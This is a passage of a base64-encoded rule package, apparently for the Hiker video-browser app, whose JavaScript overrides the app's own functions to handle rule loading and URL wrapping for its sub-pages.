nBhcnNlKHJlYWRGaWxlKCdjdXN0b21EYXRhJykgfHwgJ1tdJyksXFxcXG4gICAgICAgIHJld3JpdGVEYXRhID0gW11cXFxcbiAgICBjdXN0b21EYXRhID0gY3VzdG9tRGF0YS5yZWR1Y2UoKHNlbGYsIHYpID0+IHtcXFxcbiAgICAgICAgbGV0IGluZGV4ID0gZGF0YS5maW5kSW5kZXgoKHZ2KSA9PiB2LnRpdGxlID09IHZ2LnRpdGxlKVxcXFxuICAgICAgICBpZiAoaW5kZXggPj0gMCkge1xcXFxuICAgICAgICAgICAgc2VsZi5wdXNoKHYpXFxcXG4gICAgICAgICAgICBsZXQgcnVsZSA9IGRhdGEuc3BsaWNlKGluZGV4LCAxKVswXVxcXFxuICAgICAgICAgICAgaWYgKHNob3dBbGwgfHwgdi52aXNpYmxlKVxcXFxuICAgICAgICAgICAgICAgIHJld3JpdGVEYXRhLnB1c2goT2JqZWN0LmFzc2lnbihydWxlLCB2KSlcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICByZXR1cm4gc2VsZlxcXFxuICAgIH0sIFtdKVxcXFxuICAgIGRhdGEuZm9yRWFjaCgodikgPT4gY3VzdG9tRGF0YS5wdXNoKHsgdGl0bGU6IHYudGl0bGUsIHZpc2libGU6IHRydWUgfSkpXFxcXG4gICAgc2F2ZUZpbGUoJ2N1c3RvbURhdGEnLCBKU09OLnN0cmluZ2lmeShjdXN0b21EYXRhKSlcXFxcbiAgICAkLmV4cG9ydHMgPSByZXdyaXRlRGF0YS5jb25jYXQoZGF0YSlcXFxcbn1cXFxcblxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIueOr+Wig+WKq+aMgVxcXCIsXFxcInBhdGhcXFwiOlxcXCJoaWphY2tFbnZcXFwiLFxcXCJydWxlXFxcIjpcXFwidmFyIHsgUlVMRSwgaXNJbmRleCwgcGFnZVRpdGxlIH0gPSBNWV9QQVJBTVNcXFxcblJVTEUgPSBKU09OLnBhcnNlKGJhc2U2NERlY29kZShSVUxFKSlcXFxcbnZhciBvcmlSVUxFID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvZGF0YUxvYWQ/cnVsZT0nICsgUUlOR19USVRMRSkuZmluZCgodikgPT4gdi50aXRsZSA9PSBSVUxFLnRpdGxlKVxcXFxuaWYgKGlzSW5kZXgpIHtcXFxcbiAgICBSVUxFID0gb3JpUlVMRVxcXFxuICAgIHZhciB7IHRhYkhlYWRlciwgZnlBbGwgfSA9ICQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL0NsYXNzVGFiP3J1bGU9JyArIFFJTkdfVElUTEUsIE9iamVjdC5hc3NpZ24oeyBRSU5HX1RJVExFOiBRSU5HX1RJVExFIH0sIFJVTEUpKVxcXFxuICAgIC8vIOWkhOeQhk1ZX1JVTEVcXFxcbiAgICBNWV9SVUxFLmNsYXNzX3VybCA9IHRhYkhlYWRlci5nZXRDbGFzcyhmeUFsbCA/ICdmeUFsbCcgOiAnZnljbGFzcycpLnVybFxcXFxuICAgIE1ZX1JVTEUuYXJlYV91cmwgPSBmeUFsbCA/IE1ZX1JVTEUuY2xhc3NfdXJsIDogdGFiSGVhZGVyLmdldENsYXNzKCdmeWFyZWEnKS51cmxcXFxcbiAgICBNWV9SVUxFLnllYXJfdXJsID0gZnlBbGwgPyBNWV9SVUxFLmNsYXNzX3VybCA6IHRhYkhlYWRlci5nZXRDbGFzcygnZnl5ZWFyJykudXJsXFxcXG4gICAgTVlfUlVMRS5zb3J0X3VybCA9IGZ5QWxsID8gTVlfUlVMRS5jbGFzc191cmwgOiB0YWJIZWFkZXIuZ2V0Q2xhc3MoJ2Z5c29ydCcpLnVybFxcXFxuICAgIE1ZX1JVTEUudXJsID0gUlVMRS51cmxcXFxcbiAgICBNWV9SVUxFLmNvbF90eXBlID0gUlVMRS5jb2xfdHlwZVxcXFxuICAgIE1ZX1JVTEUuZGV0YWlsX2NvbF90eXBlID0gUlVMRS5kZXRhaWxfY29sX3R5cGVcXFxcbiAgICBNWV9SVUxFLmZpbmRfcnVsZSA9IFJVTEUuZmluZF9ydWxlXFxcXG4gICAgTVlfUlVMRS5kZXRhaWxfZmluZF9ydWxlID0gUlVMRS5kZXRhaWxfZmluZF9ydWxlXFxcXG4gICAgTVlfUlVMRS5wYXJhbXMgPSB7fVxcXFxufSBlbHNlIHtcXFxcbiAgICBSVUxFLnBhZ2VzID0gb3JpUlVMRS5wYWdlc1xcXFxuICAgIC8vIOWkhOeQhk1ZX1JVTEVcXFxcbiAgICBNWV9SVUxFLnVybCA9IE1ZX1BBUkFNUy51cmxcXFxcbiAgICBNWV9SVUxFLmNvbF90eXBlID0gUlVMRS5kZXRhaWxfY29sX3R5cGVcXFxcbiAgICBNWV9SVUxFLmZpbmRfcnVsZSA9IFJVTEUuZGV0YWlsX2ZpbmRfcnVsZVxcXFxuICAgIE1ZX1JVTEUucGFyYW1zID0gUlVMRS5wYXJhbXNcXFxcbn1cXFxcbk1ZX1JVTEUucGFnZXMgPSBSVUxFLnBhZ2VzXFxcXG5NWV9SVUxFLnBhZ2VMaXN0ID0gSlNPTi5wYXJzZShNWV9SVUxFLnBhZ2VzIHx8ICdbXScpXFxcXG5NWV9SVUxFLnRpdGxlID0gUlVMRS50aXRsZVxcXFxuTVlfUlVMRS51YSA9IFJVTEUudWFcXFxcbmxvZyhNWV9SVUxFLnVybClcXFxcbi8vIOi9veWFpeWHveaVsOW3peWFt1xcXFxudmFyIHsgZ2VuTXlSdWxlIH0gPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9mdW5jVG9vbHM/cnVsZT0nICsgUUlOR19USVRMRSwge1xcXFxuICAgIFFJTkdfVElUTEU6IFFJTkdfVElUTEUsXFxcXG4gICAgTVlfUlVMRTogTVlfUlVMRSxcXFxcbiAgICBpc0luZGV4OiBpc0luZGV4XFxcXG59KVxcXFxuLy8g6Ziy5q2icmVxdWlyZeWkmuasoei/kOihjFxcXFxuY29uc3QgbXlDb2xsX3JlcXVpcmVkID0ge31cXFxcbnJlcXVpcmUgPSBmdW5jdGlvbihwYXJhbTAsIHBhcmFtMSwgcGFyYW0yLCBwYXJhbTMsIHBhcmFtNCkge1xcXFxuICAgIGlmIChteUNvbGxfcmVxdWlyZWRbcGFyYW0wXSkgcmV0dXJuXFxcXG4gICAgbXlDb2xsX3JlcXVpcmVkW3BhcmFtMF0gPSB0cnVlXFxcXG4gICAgcGFyYW0yID0gcGFyYW0yICE9IG51bGwgPyBwYXJhbTIgOiAwXFxcXG4gICAgcGFyYW0zID0gTVlfVElDS0VUXFxcXG4gICAgcGFyYW00ID0gZXZhbFxcXFxuICAgIHJldHVybiBtZXRob2RfcmVxdWlyZS5pbnZva2UoamF2YUNvbnRleHQsIHBhcmFtMCwgcGFyYW0xLCBwYXJhbTIsIHBhcmFtMywgcGFyYW00KVxcXFxufVxcXFxucmVxdWlyZUNhY2hlID0gZnVuY3Rpb24ocGFyYW0wLCBwYXJhbTEsIHBhcmFtMiwgcGFyYW0zLCBwYXJhbTQsIHBhcmFtNSkge1xcXFxuICAgIGlmIChteUNvbGxfcmVxdWlyZWRbcGFyYW0wXSkgcmV0dXJuXFxcXG4gICAgbXlDb2xsX3JlcXVpcmVkW3BhcmFtMF0gPSB0cnVlXFxcXG4gICAgcGFyYW0zID0gcGFyYW0zICE9IG51bGwgPyBwYXJhbTMgOiAwXFxcXG4gICAgcGFyYW00ID0gTVlfVElDS0VUXFxcXG4gICAgcGFyYW01ID0gZXZhbFxcXFxuICAgIHJldHVybiBtZXRob2RfcmVxdWlyZUNhY2hlLmludm9rZShqYXZhQ29udGV4dCwgcGFyYW0wLCBwYXJhbTEsIHBhcmFtMiwgcGFyYW0zLCBwYXJhbTQsIHBhcmFtNSlcXFxcbn1cXFxcbnJjID0gcmVxdWlyZUNhY2hlXFxcXG4vLyDmnIDmlrDnq6DoioLop4TliJnnjq/looPliqvmjIFcXFxcbnNldExhc3RDaGFwdGVyUnVsZSA9IGZ1bmN0aW9uKHBhcmFtMCkge1xcXFxuICAgIGlmIChwYXJhbTAuc3RhcnRzV2l0aChcXFxcXFxcImpzOlxcXFxcXFwiKSkge1xcXFxuICAgICAgICBwYXJhbTAgPSAnanM6JyArICQudG9TdHJpbmcoKFFJTkdfVElUTEUsIE1ZX1BBUkFNUykgPT4ge1xcXFxuICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKGZldGNoKCdoaWtlcjovL3BhZ2UvaGlqYWNrRW52P3J1bGU9JyArIFFJTkdfVElUTEUpKS5ydWxlKVxcXFxuICAgICAgICAgICAgdmFyIHsgcnVuUHJlUnVsZSB9ID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvZnVuY1Rvb2xzP3J1bGU9JyArIFFJTkdfVElUTEUpXFxcXG4gICAgICAgICAgICBydW5QcmVSdWxlKG9yaVJVTEUucHJlUnVsZSlcXFxcbiAgICAgICAgfSwgUUlOR19USVRMRSwgeyB1cmw6IE1ZX1JVTEUudXJsLCBSVUxFOiBiYXNlNjRFbmNvZGUoSlNPTi5zdHJpbmdpZnkoZ2VuTXlSdWxlKCkpKSwgaXNJbmRleDogaXNJbmRleCB9KSArICc7JyArIHBhcmFtMC5zbGljZSgzKVxcXFxuICAgIH1cXFxcbiAgICBtZXRob2Rfc2V0TGFzdENoYXB0ZXJSdWxlLmludm9rZShqYXZhQ29udGV4dCwgcGFyYW0wKVxcXFxufVxcXFxuLy8g5Yqo5oCB5paw5aKe5Ye95pWw5Yqr5oyBXFxcXG5hZGRJdGVtQWZ0ZXIgPSBmdW5jdGlvbihwYXJhbTAsIHBhcmFtMSkge1xcXFxuICAgIGlmIChBcnJheS5pc0FycmF5KHBhcmFtMSkpIHBhcmFtMSA9IHBhcmFtMS5tYXAoaGlqYWNrRWwpXFxcXG4gICAgZWxzZSBwYXJhbTEgPSBoaWphY2tFbChwYXJhbTEpXFxcXG4gICAgbWV0aG9kX2FkZEl0ZW1BZnRlci5pbnZva2UoamF2YUNvbnRleHQsIHBhcmFtMCwgcGFyYW0xKVxcXFxufVxcXFxuYWRkSXRlbUJlZm9yZSA9IGZ1bmN0aW9uKHBhcmFtMCwgcGFyYW0xKSB7XFxcXG4gICAgaWYgKEFycmF5LmlzQXJyYXkocGFyYW0xKSkgcGFyYW0xID0gcGFyYW0xLm1hcChoaWphY2tFbClcXFxcbiAgICBlbHNlIHBhcmFtMSA9IGhpamFja0VsKHBhcmFtMSlcXFxcbiAgICBtZXRob2RfYWRkSXRlbUJlZm9yZS5pbnZva2UoamF2YUNvbnRleHQsIHBhcmFtMCwgcGFyYW0xKVxcXFxufVxcXFxuXFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5Ye95pWw5bel5YW3XFxcIixcXFwicGF0aFxcXCI6XFxcImZ1bmNUb29sc1xcXCIsXFxcInJ1bGVcXFwiOlxcXCJsZXQgeyBRSU5HX1RJVExFLCBNWV9SVUxFLCBpc0luZGV4IH0gPSAkLmltcG9ydFBhcmFtXFxcXG5pZiAoIU1ZX1JVTEUpIE1ZX1JVTEUgPSB7fVxcXFxuXFxcXG5mdW5jdGlvbiBydW5Db2RlKHJ1bGUpIHtcXFxcbiAgICB0cnkge1xcXFxuICAgICAgICBsZXQgW2lucHV0LCBjb2RlXSA9IHJ1bGUuc3BsaXQoJy5qczonKVxcXFxuICAgICAgICByZXR1cm4gY29kZSA/IGV2YWwoY29kZSkgOiBydWxlXFxcXG4gICAgfSBjYXRjaCAoZSkgeyByZXR1cm4gcnVsZSB9XFxcXG59XFxcXG4vLyDpppbpobXpk77mjqXmm7/mjaLliIbnsbtcXFxcbmZ1bmN0aW9uIGluZGV4VXJsKHBhcmFtKSB7XFxcXG4gICAgTVlfUlVMRSA9IEpTT04ucGFyc2UoYmFzZTY0RGVjb2RlKE1ZX1JVTEUpKVxcXFxuICAgIGxldCBwYWdlTnVtID0gcGFyc2VJbnQocGFyYW0uc3BsaXQoJyMjIycpWzFdKSxcXFxcbiAgICAgICAgdXJsID0gTVlfUlVMRS51cmwsXFxcXG4gICAgICAgIHsgZnlBbGwsIHRhYkhlYWRlciB9ID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvQ2xhc3NUYWI/cnVsZT0nICsgUUlOR19USVRMRSwgT2JqZWN0LmFzc2lnbih7IFFJTkdfVElUTEU6IFFJTkdfVElUTEUgfSwgTVlfUlVMRSkpXFxcXG5cXFxcbiAgICB1cmwgPSB0YWJIZWFkZXIuc2V0VXJsKGZ5QWxsID8gdXJsLnJlcGxhY2UoL2Z5QWxsL2csICckJHtmeUFsbH0nKSA6IHVybC5yZXBsYWNlKC9meShjbGFzc3xhcmVhfHllYXJ8c29ydCkvZywgJyQke2Z5JDF9JykpXFxcXG4gICAgdXJsID0gdXJsLnJlcGxhY2UoL2Z5cGFnZSg/OkAoLT9cXFxcXFxcXGQrKUApPyg/OlxcXFxcXFxcKihcXFxcXFxcXGQrKUApPy9nLCAoXywgc3RhcnQsIHNwYWNlKSA9PiBwYXJzZUludChzdGFydCB8fCAwKSArIDEgKyAocGFnZU51bSAtIDEpICogcGFyc2VJbnQoc3BhY2UgfHwgMSkpXFxcXG4gICAgdXJsID0gL14oW1xcXFxcXFxcc1xcXFxcXFxcU10qPykoPzpcXFxcXFxcXFtmaXJzdFBhZ2U9KFtcXFxcXFxcXHNcXFxcXFxcXFNdKj8pXFxcXFxcXFxdKT8oPzooXFxcXFxcXFwuanM6W1xcXFxcXFxcc1xcXFxcXFxcU10qPykpPyQvLmV4ZWModXJsKVxcXFxuICAgIGlmIChwYWdlTnVtID09IDEgJiYgdXJsWzJdKSB1cmxbMV0gPSB1cmxbMl1cXFxcbiAgICBpZiAodXJsWzNdICYmICF1cmxbMV0uaW5jbHVkZXMoJy5qczonKSkgdXJsWzFdICs9IHVybFszXVxcXFxuICAgIHJldHVybiBydW5Db2RlKHVybFsxXSlcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gcGFyYW1IYW5kbGUodXJsUGFyYW0sIHVhLCB1cmxUbXApIHtcXFxcbiAgICBsZXQgY2hhcnNldCwgcGFyYW1UbXBcXFxcbiAgICB0cnkgeyAvLyDpk77mjqXnmoTnvJbnoIHjgIFVQeWSjFJlZmVyZXLlupTor6XmmK/pppblhYjnu6fmib/pppbpobXpk77mjqVcXFxcbiAgICAgICAgWywgLCBjaGFyc2V0LCBwYXJhbVRtcF0gPSB1cmxUbXAuc3BsaXQoJzsnKVxcXFxuICAgICAgICBwYXJhbVRtcCA9IHBhcmFtVG1wLm1hdGNoKC9eeyguKil9JC8pWzFdLnNwbGl0KCcmJicpXFxcXG4gICAgfSBjYXRjaCAoZSkgeyBwYXJhbVRtcCA9IFtdIH1cXFxcbiAgICBsZXQgVXNlckFnZW50ID0gcGFyYW1UbXAuZmluZCgodikgPT4gdi5zdGFydHNXaXRoKCdVc2VyLUFnZW50QCcpKSxcXFxcbiAgICAgICAgUmVmZXJlciA9IHBhcmFtVG1wLmZpbmQoKHYpID0+IHYuc3RhcnRzV2l0aCgnUmVmZXJlckAnKSlcXFxcbiAgICB1cmxQYXJhbVswXSA9IHVybFBhcmFtWzBdIHx8ICdHRVQnXFxcXG4gICAgdXJsUGFyYW1bMV0gPSB1cmxQYXJhbVsxXSB8fCBjaGFyc2V0IHx8ICdVVEYtOCdcXFxcbiAgICB0cnkge1xcXFxuICAgICAgICB1cmxQYXJhbVsyXSA9IHVybFBhcmFtWzJdLm1hdGNoKC9eeyguKil9JC8pWzFdLnNwbGl0KCcmJicpXFxcXG4gICAgfSBjYXRjaCAoZSkgeyB1cmxQYXJhbVsyXSA9IFtdIH1cXFxcbiAgICAvLyDmt7vliqDlhajlsYBVQeWSjOS4iue6p1JlZmVyZXJcXFxcbiAgICBpZiAoIXVybFBhcmFtWzJdLnNvbWUoKHYpID0+IHYuc3RhcnRzV2l0aCgnVXNlci1BZ2VudEAnKSkpIHtcXFxcbiAgICAgICAgaWYgKFVzZXJBZ2VudCkgdXJsUGFyYW1bMl0ucHVzaChVc2VyQWdlbnQpXFxcXG4gICAgICAgIGVsc2UgaWYgKHVhID09ICdwYycpXFxcXG4gICAgICAgICAgICB1cmxQYXJhbVsyXS5wdXNoKCdVc2VyLUFnZW50QCcgKyBQQ19VQS5yZXBsYWNlKC87L2csICfvvJvvvJsnKS5yZXBsYWNlKC9cXFxcXFxcXD8vLCAn77yf77yfJykpXFxcXG4gICAgICAgIGVsc2UgaWYgKHVhID09ICdtb2JpbGUnKVxcXFxuICAgICAgICAgICAgdXJsUGFyYW1bMl0ucHVzaCgnVXNlci1BZ2VudEAnICsgTU9CSUxFX1VBLnJlcGxhY2UoLzsvZywgJ++8m++8mycpLnJlcGxhY2UoL1xcXFxcXFxcPy8sICfvvJ/vvJ8nKSlcXFxcbiAgICB9XFxcXG4gICAgaWYgKFJlZmVyZXIgJiYgIXVybFBhcmFtWzJdLnNvbWUoKHYpID0+IHYuc3RhcnRzV2l0aCgnUmVmZXJlckAnKSkpXFxcXG4gICAgICAgIHVybFBhcmFtWzJdLnB1c2goUmVmZXJlcilcXFxcbiAgICB1cmxQYXJhbVsyXSA9ICd7JyArIHVybFBhcmFtWzJdLmpvaW4oJyYmJykgKyAnfSdcXFxcbiAgICByZXR1cm4gdXJsUGFyYW0uam9pbignOycpXFxcXG59XFxcXG4vLyDpooTlpITnkIblubbliJ3lp4vljJZjb25maWdcXFxcbmZ1bmN0aW9uIHJ1blByZVJ1bGUocnVsZSkge1xcXFxuICAgIGlmICgodHlwZW9mIE1ZX1BBR0UgIT0gJ3VuZGVmaW5lZCcgJiYgIE1ZX1BBR0UgPT0gMSkgJiZcXFxcbiAgICAgICAgIChpc0luZGV4IHx8ICFnZXRNeVZhcignJHByZVJ1bGVfJyArIE1ZX1JVTEUudGl0bGUpKSkge1xcXFxuICAgICAgICBldmFsKHJ1bGUpXFxcXG4gICAgICAgIHB1dE15VmFyKCckcHJlUnVsZV8nICsgTVlfUlVMRS50aXRsZSwgJ1QnKVxcXFxuICAgIH1cXFxcbiAgICBsZXQgX2NmZyA9IGdldE15VmFyKCdpbml0Q29uZmlnJywgJ3t9JylcXFxcbiAgICBpZiAoX2NmZyAmJiBfY2ZnLmxlbmd0aCA+IDApIHtcXFxcbiAgICAgICAgY29uZmlnID0gSlNPTi5wYXJzZShfY2ZnKVxcXFxuICAgIH1cXFxcbn1cXFxcbi8vIOato+aWh+ino+aekOmAmueUqOWPmOmHj1xcXFxuZnVuY3Rpb24gZ2VuTXlSdWxlKCkge1xcXFxuICAgIGxldCBSVUxFID0gT2JqZWN0LmFzc2lnbih7fSwgTVlfUlVMRSlcXFxcbiAgICBkZWxldGUgUlVMRS5sYXN0X2NoYXB0ZXJfcnVsZVxcXFxuICAgIGRlbGV0ZSBSVUxFLnByZVJ1bGVcXFxcbiAgICBkZWxldGUgUlVMRS5wYWdlTGlzdFxcXFxuICAgIGRlbGV0ZSBSVUxFLnBhZ2VzXFxcXG4gICAgcmV0dXJuIFJVTEVcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gZ2VuRXhVcmwodXJsKSB7XFxcXG4gICAgdXJsID0gdXJsLnNwbGl0KCc7JylcXFxcbiAgICByZXR1cm4gdXJsLnNoaWZ0KCkgKyAnOycgKyBwYXJhbUhhbmRsZSh1cmwsIE1ZX1JVTEUudWEsIE1ZX1JVTEUudXJsKVxcXFxufVxcXFxuXFxcXG5oaWphY2tMYXp5UnVsZSA9ICQudG9TdHJpbmcoKFFJTkdfVElUTEUsIE1ZX1BBUkFNUykgPT4ge1xcXFxuICAgIGlmICghTVlfUlVMRSkgTVlfUlVMRSA9IHt9XFxcXG4gICAgTVlfUEFSQU1TID0gSlNPTi5wYXJzZShiYXNlNjREZWNvZGUoTVlfUEFSQU1TKSlcXFxcbiAgICBldmFsKEpTT04ucGFyc2UoZmV0Y2goJ2hpa2VyOi8vcGFnZS9oaWphY2tFbnY/cnVsZT0nICsgUUlOR19USVRMRSkpLnJ1bGUpXFxcXG4gICAgdmFyIHtcXFxcbiAgICAgICAgcGFyYW1IYW5kbGUsXFxcXG4gICAgICAgIGdlbkV4VXJsLFxcXFxuICAgICAgICBoaWphY2tMYXp5UnVsZSxcXFxcbiAgICAgICAgaGlqYWNrRWxcXFxcbiAgICB9ID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvZnVuY1Rvb2xzP3J1bGU9JyArIFFJTkdfVElUTEUpXFxcXG59LCBRSU5HX1RJVExFLCBiYXNlNjRFbmNvZGUoSlNPTi5zdHJpbmdpZnkoeyB1cmw6IE1ZX1JVTEUudXJsLCBSVUxFOiBiYXNlNjRFbmNvZGUoSlNPTi5zdHJpbmdpZnkoZ2VuTXlSdWxlKCkpKSwgaXNJbmRleDogaXNJbmRleCB9KSkpXFxcXG5cXFxcbmZ1bmN0aW9uIGhpamFja0VsKGVsKSB7XFxcXG4gICAgaWYoIWVsIHx8IHR5cGVvZiBlbCAhPSAnb2JqZWN0JykgcmV0dXJuXFxcXG4gICAgaWYgKCFlbC5leHRyYSkgZWwuZXh0cmEgPSB7fVxcXFxuICAgIGVsLmNvbF90eXBlID0gZWwuY29sX3R5cGUgfHwgTVlfUlVMRS5jb2xfdHlwZVxcXFxuICAgIGxldCBOT1dfUlVMRSA9IE9iamVjdC5hc3NpZ24oZ2VuTXlSdWxlKCksIHsgcGFyYW1zOiBlbC5leHRyYSB9KVxcXFxuXFxcXG4gICAgaWYgKHR5cGVvZiBlbC51cmwgIT0gJ3N0cmluZycgfHxcXFxcbiAgICAgICAgWyd4NV93ZWJ2aWV3X3NpbmdsZScsICdpbnB1dCddLnNvbWUoKHYpID0+IGVsLmNvbF90eXBlID09IHYpIHx8XFxcXG4gICAgICAgIFsn5rW36ZiU6KeG55WMJywgJ2phdmFzY3JpcHQ6J10uc29tZSgodikgPT4gZWwudXJsLnN0YXJ0c1dpdGgodikpIHx8XFxcXG4gICAgICAgIFsncnVsZScsICdwaWNzJywgJ3RvYXN0JywgJ2NvcHknLCAnZWRpdEZpbGUnLCAneDUnLCAneDVXZWJWaWV3JywgJ3g1UGxheScsICd3ZWInLCAneDVSdWxlJywgJ3dlYlJ1bGUnLFxcXFxuICAgICAgICAgICAgJ2Rvd25sb2FkJywgJ3NoYXJlJywgJ2ZpbGVTZWxlY3QnLCAndmlkZW8nXS5zb21lKCh2KSA9PiBlbC51cmwuc3RhcnRzV2l0aCh2ICsgJzovLycpKSkge1xcXFxuICAgICAgICByZXR1cm4gZWxcXFxcbiAgICB9IGVsc2UgaWYgKGVsLnVybC5zdGFydHNXaXRoKCdpbnB1dDovLycpKSB7XFxcXG4gICAgICAgIGxldCBwYXJhID0gSlNPTi5wYXJzZShlbC51cmwuc2xpY2UoOCkpXFxcXG4gICAgICAgIGlmIChwYXJhLmpzKSBwYXJhLmpzID0gaGlqYWNrTGF6eVJ1bGUgKyAnOycgKyBwYXJhLmpzXFxcXG4gICAgICAgIGVsLnVybCA9ICdpbnB1dDovLycgKyBKU09OLnN0cmluZ2lmeShwYXJhKVxcXFxuICAgICAgICByZXR1cm4gZWxcXFxcbiAgICB9IGVsc2UgaWYgKGVsLnVybC5zdGFydHNXaXRoKCdjb25maXJtOi8vJykpIHtcXFxcbiAgICAgICAgbGV0IHJlSW5kZXggPSBlbC51cmwuaW5kZXhPZignLmpzOicpXFxcXG4gICAgICAgIGlmIChyZUluZGV4ID49IDApIGVsLnVybCA9IGVsLnVybC5zbGljZSgwLCByZUluZGV4KSArICcuanM6JyArIGhpamFja0xhenlSdWxlICsgJzsnICsgZWwudXJsLnNsaWNlKHJlSW5kZXggKyA0KVxcXFxuICAgICAgICByZXR1cm4gZWxcXFxcbiAgICB9IGVsc2UgaWYgKGVsLnVybC5zdGFydHNXaXRoKCdzZWxlY3Q6Ly8nKSkge1xcXFxuICAgICAgICBsZXQgcGFyYSA9IEpTT04ucGFyc2UoZWwudXJsLnNsaWNlKDkpKVxcXFxuICAgICAgICBpZiAocGFyYS5qcykgcGFyYS5qcyA9IGhpamFja0xhenlSdWxlICsgJzsnICsgcGFyYS5qc1xcXFxuICAgICAgICBlbC51cmwgPSAnc2VsZWN0Oi8vJyArIEpTT04uc3RyaW5naWZ5KHBhcmEpXFxcXG4gICAgICAgIHJldHVybiBlbFxcXFxuICAgIH0gZWxzZSBpZiAoZWwudXJsLmluY2x1ZGVzKCdAcnVsZT0nKSkge1xcXFxuICAgICAgICBsZXQgW18sIHVybCwgcnVsZV0gPSBlbC51cmwubWF0Y2goL14oW1xcXFxcXFxcc1xcXFxcXFxcU10qPylAcnVsZT0oW1xcXFxcXFxcc1xcXFxcXFxcU10qKSQvKVxcXFxuICAgICAgICBlbC51cmwgPSB1cmxcXFxcbiAgICAgICAgTk9XX1JVTEUuZGV0YWlsX2ZpbmRfcnVsZSA9IHJ1bGVcXFxcbiAgICAgICAgTk9XX1JVTEUuZGV0YWlsX2NvbF90eXBlID0gTVlfUlVMRS5jb2xfdHlwZVxcXFxuICAgIH0gZWxzZSBpZiAoZWwudXJsLnN0YXJ0c1dpdGgoJ2hpa2VyOi8vcGFnZS8nKSkge1xcXFxuICAgICAgICBpZiAoZWwudXJsLmluY2x1ZGVzKCdydWxlPScpIHx8IGVsLmV4dHJhLnJ1bGUpXFxcXG4gICAgICAgICAgICByZXR1cm4gZWxcXFxcbiAgICAgICAgbGV0IFtfLCBwYXRoLCBmbGFnLCBwYXJhbXNdID0gZWwudXJsLm1hdGNoKC9eaGlrZXI6XFxcXFxcXFwvXFxcXFxcXFwvcGFnZVxcXFxcXFxcLyguKz8pKCMuKj8pPyg/OlxcXFxcXFxcPyguKikpPyQvKSxcXFxcbiAgICAgICAgICAgIHN1YlBhZ2UgPSBNWV9SVUxFLnBhZ2VMaXN0LmZpbmQoKHYpID0+IHYucGF0aCA9PSBwYXRoKSxcXFxcbiAgICAgICAgICAgIHN1YlVybCA9IChwYXJhbXMgfHwgJycpLnNwbGl0KCcmJykuZmluZCgodikgPT4gdi5zdGFydHNXaXRoKCd1cmw9JykpXFxcXG4gICAgICAgIGVsLnVybCA9IChzdWJVcmwgPyBzdWJVcmwuc2xpY2UoNCkucmVwbGFjZSgv77yf77yfL2csICc/JykucmVwbGFjZSgv77yG77yGL2csICcmJykgOiAoZWwuZXh0cmEgfHwge30pLnVybCkgfHwgJ2hpa2VyOi8vZW1wdHknICsgZmxhZyArICc/JyArIChwYXJhbXMgfHwgJycpXFxcXG4gICAgICAgIE5PV19SVUxFLmRldGFpbF9maW5kX3J1bGUgPSBzdWJQYWdlLnJ1bGVcXFxcbiAgICAgICAgTk9XX1JVTEUuZGV0YWlsX2NvbF90eXBlID0gc3ViUGFnZS5jb2xfdHlwZVxcXFxuICAgIH0gZWxzZSBpZiAoZWwudXJsLmluY2x1ZGVzKCdAbGF6eVJ1bGU9JykpIHtcXFxcbiAgICAgICAgbGV0IHJlSW5kZXggPSBlbC51cmwuaW5kZXhPZignLmpzOicpXFxcXG4gICAgICAgIGlmIChyZUluZGV4ID49IDApIGVsLnVybCA9IGVsLnVybC5zbGljZSgwLCByZUluZGV4KSArICcuanM6JyArIGhpamFja0xhenlSdWxlICsgJzsnICsgZWwudXJsLnNsaWNlKHJlSW5kZXggKyA0KVxcXFxuICAgICAgICByZXR1cm4gZWxcXFxcbiAgICB9IGVsc2UgaWYgKGlzSW5kZXgpIHtcXFxcbiAgICAgICAgaWYgKCFNWV9SVUxFLmRldGFpbF9maW5kX3J1bGUgfHwgL2hpa2VyOlxcXFxcXFxcL1xcXFxcXFxcLyg/IWVtcHR5LiskKS8udGVzdChlbC51cmwpKSByZXR1cm4gZWxcXFxcbiAgICB9IGVsc2Uge1xcXFxuICAgICAgICByZXR1cm4gZWxcXFxcbiAgICB9XFxcXG4gICAgZWwuZXh0cmEgPSBPYmplY3QuYXNzaWduKHt9LCBlbC5leHRyYSwge1xcXFxuICAgICAgICB1cmw6IGdlbkV4VXJsKGVsLnVybCksXFxcXG4gICAgICAgIFJVTEU6IGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShOT1dfUlVMRSkpLFxcXFxuICAgICAgICBwYWdlVGl0bGU6IGlzSW5kZXggJiYgZWwudGl0bGVcXFxcbiAgICB9KVxcXFxuICAgIGVsLnVybCA9ICdoaWtlcjovL3BhZ2UvZnJhbWVMb2FkP3J1bGU9JyArIFFJTkdfVElUTEVcXFxcbiAgICByZXR1cm4gZWxcXFxcbn1cXFxcbiQuZXhwb3J0cyA9IHtcXFxcbiAgICBydW5Db2RlOiBydW5Db2RlLFxcXFxuICAgIGluZGV4VXJsOiBpbmRleFVybCxcXFxcbiAgICBwYXJhbUhhbmRsZTogcGFyYW1IYW5kbGUsXFxcXG4gICAgcnVuUHJlUnVsZTogcnVuUHJlUnVsZSxcXFxcbiAgICBnZW5NeVJ1bGU6IGdlbk15UnVsZSxcXFxcbiAgICBnZW5FeFVybDogZ2VuRXhVcmwsXFxcXG4gICAgaGlqYWNrTGF6eVJ1bGU6IGhpamFja0xhenlSdWxlLFxcXFxuICAgIGhpamFja0VsOiBoaWphY2tFbFxcXFxufVxcXFxuXFxcIn1dXCIsXCJwcm94eVwiOlwiXCJ9IiwicGljVXJsIjoiaHR0cHM6Ly9pY29uZm9udC50eXJhbnRnLmNvbS9hcGkvaWxsdXN0cmF0ZS5zdmc/c3ZnX3N0cmluZz0lM0NzdmclMjBjbGFzcyUzRCUyMmljb24lMjIlMjBzdHlsZSUzRCUyMndpZHRoJTNBJTIwMWVtJTNC